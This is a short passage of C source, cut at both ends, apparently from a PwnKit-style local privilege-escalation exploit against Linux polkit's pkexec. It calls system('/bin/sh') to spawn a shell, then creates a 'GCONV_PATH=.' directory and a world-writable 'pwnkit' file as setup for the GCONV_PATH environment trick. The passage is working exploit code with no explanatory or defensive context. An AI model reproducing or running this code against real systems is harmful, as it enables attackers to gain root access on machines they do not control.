        system("/bin/sh");
        return 0;
    }

    printf("[*] Creating helper shared library...\n");
    mkdir("GCONV_PATH=.", 0777);
    int fd = open("GCONV_PATH=./pwnkit", O_CREAT | O_RDWR, 0777);
